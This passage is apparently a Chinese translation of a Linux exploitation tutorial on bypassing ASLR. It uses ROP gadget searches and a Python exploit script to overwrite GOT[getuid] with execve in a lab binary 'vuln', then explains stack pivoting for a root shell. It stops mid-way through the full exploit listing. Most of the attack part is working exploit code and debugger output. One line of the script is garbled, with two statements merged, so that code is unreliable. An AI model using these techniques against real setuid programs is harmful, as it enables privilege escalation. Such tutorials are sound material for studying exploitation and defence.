+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">$ ~/roptools/rp++ --atsyntax -f ./vuln -r 4</div><div class="line">Trying to open './vuln'..</div><div class="line">Loading ELF information..</div><div class="line">FileFormat: Elf, Arch: Ia32</div><div class="line">Using the AT&amp;T syntax..</div><div class="line"></div><div class="line">Wait a few seconds, rp++ is looking for gadgets..</div><div class="line">in PHDR</div><div class="line">0 found.</div><div class="line"></div><div class="line">in LOAD</div><div class="line">166 found.</div><div class="line"></div><div class="line">A total of 166 gadgets found.</div><div class="line">...</div><div class="line">0x08048499: addl $0x0804A028, %eax ; addl %eax, 0x5D5B04C4(%ebx) ; ret ; (1 found)</div><div class="line">0x0804849e: addl %eax, 0x5D5B04C4(%ebx) ; ret ; (1 found)</div><div class="line">0x08048482: addl %esp, 0x0804A02C(%ebx) ; calll *0x08049F1C(,%eax,4) ; (1 found)</div><div class="line">0x0804860e: addl -0x0B8A0008(%ebx), %eax ; addl $0x04, %esp ; popl %ebx ; popl %ebp ; ret ; (1 found)</div><div class="line">...</div><div class="line">$</div></pre></td></tr></table></figure>
+<p>太棒了，我们找到了一个’add gadget’用来将结果拷贝到寄存器中！现在，如果我们将EBX含有GOT[getuid]+0xb8a0008，EAX含有偏移差，就可以成功执行GOT解引用了！</p>
+<p>-Gadget 2: 正如在GOT覆盖那样，我们已经在可执行文件’vuln’中找到了’pop %ebx;ret’ gadget。</p>
+<p>-Gadget 3: 正如在GOT覆盖那样，可执行文件’vuln’中找不到’pop %eax’ret’ gadget。</p>
+<p>-Gadget 4: 通过调用寄存器来调用execve函数。因此我们需要一个’call *eax’ gadget</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">$ ~/roptools/rp++ --atsyntax -f ./vuln -r 1</div><div class="line">Trying to open './vuln'..</div><div class="line">Loading ELF information..</div><div class="line">FileFormat: Elf, Arch: Ia32</div><div class="line">Using the AT&amp;T syntax..</div><div class="line"></div><div class="line">Wait a few seconds, rp++ is looking for gadgets..</div><div class="line">in PHDR</div><div class="line">0 found.</div><div class="line"></div><div class="line">in LOAD</div><div class="line">65 found.</div><div class="line"></div><div class="line">A total of 65 gadgets found.</div><div class="line">...</div><div class="line">0x080485bb: calll *%-0x000000E0(%ebx,%esi,4) ; (1 found)</div><div class="line">0x080484cf: calll *%eax ; (1 found)</div><div class="line">0x0804860b: calll *%eax ; (1 found)</div><div class="line">...</div><div class="line">$</div></pre></td></tr></table></figure>
+<p>太棒了！我们找到了’call *eax’ gadget。 但仍然无法找到gadget 3 ‘pop %eax’ret’ ，GOT解引用依然变得不可能。</p>
+<p><u>栈布局</u>： 下图描绘了利用gadget链接来做到GOT解引用</p>
+<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/aslrgotgor2.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/aslrgotgor2.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
+
+<p>在似乎没有找到其他方法的时候(至少当我开始学习ROP的时候), <a href="https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-iii/v0ids3curity.blogspot.in" target="_blank" rel="external">Reno</a>教我利用人工ROP gadget搜索来达成目的。多谢！ 继续阅读下去吧！</p>
+<h3 id="0X08-ROP-gadget人工搜索"><a href="#0X08-ROP-gadget人工搜索" class="headerlink" title="0X08 ROP gadget人工搜索"></a>0X08 ROP gadget人工搜索</h3><p>既然ROP gadget工具无法找到’pop eax’ret’ gadget, 我们就试试人工搜索方法来看看是否有任何有趣的gadgets能帮助我们将偏移差拷贝到EAX寄存器中。</p>
+<p>使用下面命令反汇编’vuln’二进制文件</p>
+<pre><code>$objdump -d vuln &gt; out
+</code></pre><p>-Gadget 4: 将偏移差（0xfffff530)加载到EAX寄存器。反汇编中可以看到，一条mov指令可以将栈中的内容拷贝到EAX中。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="number">80485b</span>3: mov <span class="number">0x34</span>(%esp),%eax</div><div class="line"><span class="number">80485b</span>7: mov %eax,<span class="number">0x4</span>(%esp)</div><div class="line"><span class="number">80485b</span>b: call *<span class="number">-0xe0</span>(%ebx,%esi,<span class="number">4</span>)</div><div class="line"><span class="number">80485</span>c2: add $<span class="number">0x1</span>,%esi</div><div class="line"><span class="number">80485</span>c5: cmp %edi,%esi</div><div class="line"><span class="number">80485</span>c7: jne <span class="number">80485</span>a8 &lt;__libc_csu_init+<span class="number">0x38</span>&gt;</div><div class="line"><span class="number">80485</span>c9: add $<span class="number">0x1c</span>,%esp</div><div class="line"><span class="number">80485</span>cc: pop %ebx</div><div class="line"><span class="number">80485</span>cd: pop %esi</div><div class="line"><span class="number">80485</span>ce: pop %edi</div><div class="line"><span class="number">80485</span>cf: pop %ebp</div><div class="line"><span class="number">80485</span>d0: ret</div></pre></td></tr></table></figure>
+<p>但看起来’ret’(0x80485d0)离这条指令(0x80485b3)很远。因此这里主要的挑战就是在执行’ret’之前，EAX的内容没有被修改。</p>
+<p><u>未被修改的EAX</u>: 我们来看看如何做到在执行’ret’之前，EAX不被修改。这里有条call指令(0x80485bb)，所以找出一种方法加载EBX与ESI以便让call指令调用一个不修改EAX的函数。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="number">0804861</span>c &lt;_fini&gt;:</div><div class="line"><span class="number">804861</span>c: push %ebx</div><div class="line"><span class="number">804861</span>d: sub $<span class="number">0x8</span>,%esp</div><div class="line"><span class="number">8048620</span>: call <span class="number">8048625</span> &lt;_fini+<span class="number">0x9</span>&gt;</div><div class="line"><span class="number">8048625</span>: pop %ebx</div><div class="line"><span class="number">8048626</span>: add $<span class="number">0x19cf</span>,%ebx</div><div class="line"><span class="number">804862</span>c: call <span class="number">8048450</span> &lt;__do_global_dtors_aux&gt;</div><div class="line"><span class="number">8048631</span>: add $<span class="number">0x8</span>,%esp</div><div class="line"><span class="number">8048634</span>: pop %ebx</div><div class="line"><span class="number">8048635</span>: ret</div><div class="line"></div><div class="line"><span class="number">08048450</span> &lt;__do_global_dtors_aux&gt;:</div><div class="line"><span class="number">8048450</span>: push %ebp</div><div class="line"><span class="number">8048451</span>: mov %esp,%ebp</div><div class="line"><span class="number">8048453</span>: push %ebx</div><div class="line"><span class="number">8048454</span>: sub $<span class="number">0x4</span>,%esp</div><div class="line"><span class="number">8048457</span>: cmpb $<span class="number">0x0</span>,<span class="number">0x804a028</span></div><div class="line"><span class="number">804845</span>e: jne <span class="number">804849f</span> &lt;__do_global_dtors_aux+<span class="number">0x4f</span>&gt;</div><div class="line">...</div><div class="line"><span class="number">804849f</span>: add $<span class="number">0x4</span>,%esp</div><div class="line"><span class="number">80484</span>a2: pop %ebx</div><div class="line"><span class="number">80484</span>a3: pop %ebp</div><div class="line"><span class="number">80484</span>a4: ret</div></pre></td></tr></table></figure>
+<p>_fini调用了_do_global_dtors_aux, 这里当我们将内存区域0x804a028设置为0x1时，EAX不会被修改。</p>
+<p>那EBX与ESI中应该是什么值才能调用_fini呢？</p>
+<ul>
+<li>1.首先，我们需要找到一个含有_fini(0x804861c)地址的内存区域。 如下所示，内存地址0x8049f3x中含有_fini的地址</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="number">0x8049f28</span> :    <span class="number">0x00000001</span> <span class="number">0x00000010</span> <span class="number">0x0000000c</span> <span class="number">0x08048354</span></div><div class="line"><span class="number">0x8049f38</span> &lt;_DYNAMIC+<span class="number">16</span>&gt;: <span class="number">0x0000000d</span> <span class="number">0x0804861c</span> <span class="number">0x6ffffef5</span> <span class="number">0x080481ac</span></div><div class="line"><span class="number">0x8049f48</span> &lt;_DYNAMIC+<span class="number">32</span>&gt;: <span class="number">0x00000005</span> <span class="number">0x0804826c</span></div></pre></td></tr></table></figure>
+<ul>
+<li>2.将ESI设置为0x01020101.采用这个值，那是因为我们不能让ESI中为0x0，而这时一个strcpy漏洞代码，0是个不好的字符！ 另外，我们要确保存储在EBX中的结果值也不能是0！</li>
+<li><ol>
+<li>将EBX设置为下面的值</li>
+</ol>
+</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ebx+esi*<span class="number">4</span><span class="number">-0xe0</span> = <span class="number">0x8049f3c</span></div><div class="line">ebx = <span class="number">0x8049f3c</span> -(<span class="number">0x01020101</span>*<span class="number">0x4</span>) + <span class="number">0xe0</span></div><div class="line">ebx = <span class="number">0x3fc9c18</span></div></pre></td></tr></table></figure>
+<p>这样一来，我们发现要调用_fini，就需要确保EBX和ESI中必须分别加载0x3fc9c18与0x01020101</p>
+<p>-Gadget 5: 加载0x3fc9c18到EBX中</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">$ ~/roptools/rp++ --atsyntax -f ./vuln -r 1</div><div class="line">Trying to open './vuln'..</div><div class="line">Loading ELF information..</div><div class="line">FileFormat: Elf, Arch: Ia32</div><div class="line">Using the AT&amp;T syntax..</div><div class="line"></div><div class="line">Wait a few seconds, rp++ is looking for gadgets..</div><div class="line">in PHDR</div><div class="line">0 found.</div><div class="line"></div><div class="line">in LOAD</div><div class="line">65 found.</div><div class="line"></div><div class="line">A total of 65 gadgets found.</div><div class="line">...</div><div class="line">0x08048618: popl %ebp ; ret ; (1 found)</div><div class="line">0x08048380: popl %ebx ; ret ; (1 found)</div><div class="line">0x08048634: popl %ebx ; ret ; (1 found)</div><div class="line">...</div><div class="line">$</div></pre></td></tr></table></figure>
+<p>-Gadget 6: 加载0x01020101到ESI,加载0x01020102到EDI</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">$ ~/roptools/rp++ --atsyntax -f ./vuln -r 3</div><div class="line">Trying to open './vuln'..</div><div class="line">Loading ELF information..</div><div class="line">FileFormat: Elf, Arch: Ia32</div><div class="line">Using the AT&amp;T syntax..</div><div class="line"></div><div class="line">Wait a few seconds, rp++ is looking for gadgets..</div><div class="line">in PHDR</div><div class="line">0 found.</div><div class="line"></div><div class="line">in LOAD</div><div class="line">135 found.</div><div class="line"></div><div class="line">A total of 135 gadgets found.</div><div class="line">...</div><div class="line">0x080485ce: popl %edi ; popl %ebp ; ret ; (1 found)</div><div class="line">0x080485cd: popl %esi ; popl %edi ; popl %ebp ; ret ; (1 found)</div><div class="line">0x08048390: pushl 0x08049FF8 ; jmpl *0x08049FFC ; (1 found)</div><div class="line">...</div><div class="line">$</div></pre></td></tr></table></figure>
+<p>-Gadget 7: 将0x1拷贝到内存区域0x804a028中</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">$ ~/roptools/rp++ --atsyntax -f ./vuln -r 5</div><div class="line">Trying to open './vuln'..</div><div class="line">Loading ELF information..</div><div class="line">FileFormat: Elf, Arch: Ia32</div><div class="line">Using the AT&amp;T syntax..</div><div class="line"></div><div class="line">Wait a few seconds, rp++ is looking for gadgets..</div><div class="line">in PHDR</div><div class="line">0 found.</div><div class="line"></div><div class="line">in LOAD</div><div class="line">183 found.</div><div class="line"></div><div class="line">A total of 183 gadgets found.</div><div class="line">...</div><div class="line">0x080485ca: les (%ebx,%ebx,2), %ebx ; popl %esi ; popl %edi ; popl %ebp ; ret ; (1 found)</div><div class="line">0x08048498: movb $0x00000001, 0x0804A028 ; addl $0x04, %esp ; popl %ebx ; popl %ebp ; ret ; (1 found)</div><div class="line">0x0804849b: movb 0x83010804, %al ; les (%ebx,%ebx,2), %eax ; popl %ebp ; ret ; (1 found)</div><div class="line">...</div><div class="line">$</div></pre></td></tr></table></figure>
+<p>现在，我们已经完成了gadget搜索！ 我们开始这个游戏吧！</p>
+<p><u>Gadget搜索总结</u>: </p>
+<ul>
+<li>要成功调用gadget 1,我们需要gadget 2和3</li>
+<li>由于没有gadget 3,我们做了人工搜索并找出了gadget 4,5,6和7.<ul>
+<li>要成功调用gadget4,我们需要gadget 5,6和7</li>
+</ul>
+</li>
+</ul>
+<p><u>漏洞利用代码</u>:下面的漏洞利用代码用execve函数地址覆盖了GOT[getuid]!!</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">from subprocess <span class="keyword">import</span> call</div><div class="line"></div><div class="line"><span class="string">'''</span></div><div class="line"> G1: <span class="number">0x0804849e</span>: addl %eax, <span class="number">0x5D5B04C4</span>(%ebx) ; ret ;</div><div class="line"> G2: <span class="number">0x080484a2</span>: popl %ebx ; pop ebp; ret ;</div><div class="line"> G3: <span class="number">0</span>x????????: popl %eax ; ret ; (NOT found)</div><div class="line"> G4: <span class="number">0x080485b3</span>: mov <span class="number">0x34</span>(%esp),%eax...</div><div class="line"> G5: <span class="number">0x08048380</span>: pop ebx ; ret ;</div><div class="line"> G6: <span class="number">0x080485cd</span>: pop esi ; pop edi ; pop ebp ; ret ;</div><div class="line"> G7: <span class="number">0x08048498</span>: movb $<span class="number">0x1</span>,<span class="number">0x804a028</span>...</div><div class="line"><span class="string">'''</span></div><div class="line"></div><div class="line">g1 = <span class="number">0x0804849e</span></div><div class="line">g2 = <span class="number">0x080484a2</span></div><div class="line">g4 = <span class="number">0x080485b3</span></div><div class="line">g5 = <span class="number">0x08048380</span></div><div class="line">g6 = <span class="number">0x080485cd</span></div><div class="line">g7 = <span class="number">0x08048498</span></div><div class="line">dummy = <span class="number">0xdeadbeef</span></div><div class="line">esi = <span class="number">0x01020101</span></div><div class="line">edi = <span class="number">0x01020102</span></div><div class="line">ebx = <span class="number">0x3fc9c18</span> #ebx = <span class="number">0x8049f3c</span> - (esi*<span class="number">4</span>) + <span class="number">0xe0</span></div><div class="line">off = <span class="number">0xfffff530</span></div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> <span class="keyword">return</span> <span class="keyword">struct</span>.pack(<span class="string">"&lt;I"</span>,num* <span class="number">268</span> #Junk</div><div class="line">buf += conv(g7) #movb $<span class="number">0x1</span>,<span class="number">0x804a028</span>; add esp, <span class="number">0x04</span>; pop ebx; pop ebp; ret;</div><div class="line">buf += conv(dummy)</div><div class="line">buf += conv(dummy)</div><div class="line">buf += conv(dummy)</div><div class="line">buf += conv(g6) #pop esi; pop edi; pop ebp; ret;</div><div class="line">buf += conv(esi) #esi</div><div class="line">buf += conv(edi) #edi</div><div class="line">buf += conv(dummy)</div><div class="line">buf += conv(g5) #pop ebx; ret;</div><div class="line">buf += conv(ebx) #ebx</div><div class="line">buf += conv(g4) #mov <span class="number">0x34</span>(%esp),%eax; ...</div><div class="line"></div><div class="line"><span class="keyword">for</span> num in range(<span class="number">0</span>,<span class="number">11</span>):</div><div class="line"> buf += conv(dummy)</div><div class="line"></div><div class="line">buf += conv(g2) #pop ebx; pop ebp; ret;</div><div class="line">ebx = <span class="number">0xaaa99b40</span> #getuid@GOT<span class="number">-0x5d5b04c4</span></div><div class="line">buf += conv(ebx)</div><div class="line">buf += conv(off)</div><div class="line">buf += conv(g1) #addl %eax, <span class="number">0x5D5B04C4</span>(%ebx); ret;</div><div class="line">buf += <span class="string">"B"</span> * <span class="number">4</span></div><div class="line"></div><div class="line">print <span class="string">"Calling vulnerable program"</span></div><div class="line">call([<span class="string">"./vuln"</span>, buf])</div></pre></td></tr></table></figure>
+<p>执行上面的漏洞利用代码会生成一个core文件。打开core文件，可以看到GOT[getuid]被execve函数地址覆盖了(如下所示)</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">$ python oexp.py </div><div class="line">Calling vulnerable program</div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��ﾭ�ﾭ�ﾭ�ͅﾭހ�����ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭ�ﾭޢ�@���0�����BBBB</div><div class="line">Len:376</div><div class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/new/aslr/part3$ sudo gdb -q vuln</div><div class="line">Reading symbols from /home/sploitfun/lsploits/new/aslr/part3/vuln...(no debugging symbols found)...done.</div><div class="line">(gdb) core-file core </div><div class="line">[New LWP 18781]</div><div class="line">warning: Can't read pathname for load map: Input/output error.</div><div class="line">Core was generated by `./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.</div><div class="line">Program terminated with signal 11, Segmentation fault.</div><div class="line">#0 0x42424242 in ?? ()</div><div class="line">(gdb) x/1xw 0x804a004</div><div class="line">0x804a004 &lt;getuid@got.plt&gt;: 0xb761a1f0</div><div class="line">(gdb) p getuid</div><div class="line">$1 = &#123;&#125; 0xb761acc0 </div><div class="line">(gdb) p execve</div><div class="line">$2 = &#123;&#125; 0xb761a1f0 </div><div class="line">(gdb)</div></pre></td></tr></table></figure>
+<p>太棒了，我们已经成功利用execve函数地址覆盖了getuid的GOT表项。因此从现在开始，任意对getuid的调用都会调用execve~~</p>
+<p><u>触发 root shell</u>： 我们的漏洞利用代码还不完整。我们只执行了GOT覆盖但还没有触发root shell。 为了触发一个root shell， 将下面的libc函数(以及它们的参数)拷贝到栈中</p>
+<pre><code>seteuid@PLT | getuid@PLT | seteuid_arg | execve_arg1 | execve_arg2 | execve_arg3
+</code></pre><p>这里</p>
+<ul>
+<li>setuid@PLT - setuid的plt代码地址（0x80483c0)</li>
+<li>getuid@PLT - getuid的plt代码地址（0x80483b0)。 由于已经执行了GOT覆盖，这里会调用execve函数</li>
+<li>setuid_arg必须为0才能获取root shell</li>
+<li>execve_arg1 - 文件名 - 字符串“/bin/sh”的地址</li>
+<li>execve_arg2 - argv - 参数数组的地址，内容为[ “/bin/sh”的地址, NULL]</li>
+<li>execve_arg3 - envp - NULL</li>
+</ul>
+<p>在这篇文章中，由于我们没有直接用0来溢出缓冲区(0是个不好的字符), 我们利用strcpy调用链拷贝0用来替代setuid_arg。反由于栈是被随机化的，这种方法在这里并不可行， 找出setuid_arg栈的地址变得困难起来。</p>
+<pre><code>如何绕过栈地址随机化
+</code></pre><p>可以利用自定义栈和栈旋转(stack pivoting)技术做到！</p>
+<pre><code>什么是自定义栈
+</code></pre><p>自定义栈就是被攻击者控制的栈区域。攻击者拷贝libc函数链以及相应的参数来绕过栈随机化。由于攻击者进程的选择任意非位置独立(non position independent）并可写的内存区域作为自定义栈。在我们的二进制文件’vuln’中，可写并非位置独立的内存区域是从0x804a000到0x804b000（如下所示)</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">$ cat /proc<span class="comment">//maps</span></div><div class="line"><span class="number">08048000</span><span class="number">-08049000</span> r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">399848</span> /home/sploitfun/lsploits/aslr/vuln</div><div class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">399848</span> /home/sploitfun/lsploits/aslr/vuln</div><div class="line"><span class="number">0804</span>a000<span class="number">-0804</span>b000 rw-p <span class="number">00001000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">399848</span> /home/sploitfun/lsploits/aslr/vuln</div><div class="line">b7e21000-b7e22000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </div><div class="line">b7e22000-b7fc5000 r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">1711755</span> /lib/i386-linux-gnu/libc<span class="number">-2.15</span>.so</div><div class="line">b7fc5000-b7fc7000 r--p <span class="number">001</span>a3000 <span class="number">08</span>:<span class="number">01</span> <span class="number">1711755</span> /lib/i386-linux-gnu/libc<span class="number">-2.15</span>.so</div><div class="line">b7fc7000-b7fc8000 rw-p <span class="number">001</span>a5000 <span class="number">08</span>:<span class="number">01</span> <span class="number">1711755</span> /lib/i386-linux-gnu/libc<span class="number">-2.15</span>.so</div><div class="line">b7fc8000-b7fcb000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </div><div class="line">b7fdb000-b7fdd000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> </div><div class="line">b7fdd000-b7fde000 r-xp <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> [vdso]</div><div class="line">b7fde000-b7ffe000 r-xp <span class="number">00000000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">1711743</span> /lib/i386-linux-gnu/ld<span class="number">-2.15</span>.so</div><div class="line">b7ffe000-b7fff000 r--p <span class="number">0001f</span>000 <span class="number">08</span>:<span class="number">01</span> <span class="number">1711743</span> /lib/i386-linux-gnu/ld<span class="number">-2.15</span>.so</div><div class="line">b7fff000-b8000000 rw-p <span class="number">00020000</span> <span class="number">08</span>:<span class="number">01</span> <span class="number">1711743</span> /lib/i386-linux-gnu/ld<span class="number">-2.15</span>.so</div><div class="line">bffdf000-c0000000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span> [<span class="built_in">stack</span>]</div><div class="line">$</div></pre></td></tr></table></figure>
+<p>含有.data和.bss段的内存区域可以用来当做自定义栈。我将自定义站的位置选为0x804a360.</p>
+<p>选择选择好自定义栈位置后，我们需要拷贝libc函数链以及相应的参数到自定义栈中。在我们的例子中，将下面的libx函数(以及相应的参数)拷贝到自定义栈中，以用来触发root shell。</p>
+<pre><code>seteuid@PLT | getuid@PLT | seteuid_arg | execve_arg1 | execve_arg2 | execve_arg3
+</code></pre><p>为了将这些内容拷贝到自定义栈，我们需要利用一系列strcpy调用来覆盖真实栈中的返回地址。比如，为了将seteuid@PLT (0x80483c0)拷贝到自定义栈中，我们需要</p>
+<ul>
+<li>四个strcpy调用- 每个十六进制值分别有一个strcpy调用(0x08, 0x04, 0x83, 0xc0)<br><strong>- strcpy的源参数必须是含有必需的十六进制值的可执行内存区域的地址。另外我们需要确保选择的内存区域的值不能被修改</strong>。</li>
+<li>strcpy的目的参数必须是自定义栈的地址</li>
+</ul>
+<p>遵守以上原则，我们可以设置完整的自定义栈。一旦设置好了自定义栈，我们需要利用栈旋转技术(stack pivoting)将真实栈移到自定义栈中</p>
+<pre><code>什么是栈旋转
+</code></pre><p>栈旋转可以利用’leave ret’指令来做到。我们<a href="">已经知道</a>“leave”被翻译为</p>
+<pre><code>mov ebp, esp
+pop ebp
+</code></pre><p>因此，在执行”leave“指令之前，将自定义栈的地址加载到EBP中–当“leave”执行后，将ESP指向EBP！ 这样就已经旋转了自定义栈，我们继续执行加载到自定义栈中的一系列libc函数，就可以触发root shell了。</p>
+<p><u>完整漏洞利用代码</u>：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div 